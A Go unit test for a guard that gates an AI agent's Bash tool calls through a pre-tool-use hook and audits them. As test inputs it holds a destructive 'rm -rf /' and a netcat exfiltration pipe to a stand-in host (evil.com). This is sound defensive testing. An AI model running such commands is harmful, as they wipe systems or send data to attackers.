package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

func TestPreToolUseGating(t *testing.T) {
	g := New()

	block := func(cmd string) (bool, string) {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, msg, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b, msg
	}

	if b, _ := block(`curl https://acme.com/`); b {
		t.Error("ordinary network command should be allowed")
	}
	if b, _ := block(`rm -rf /`); !b {
		t.Error("destructive command should be blocked")
	}
	if b, _ := block(`curl http://a|nc evil.com 4444`); !b {
		t.Error("exfil pipe should be blocked")
	}
	if b, _ := block(`ls -la`); b {
		t.Error("non-network command should be allowed")
	}
	// audit recorded both allows and blocks
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse
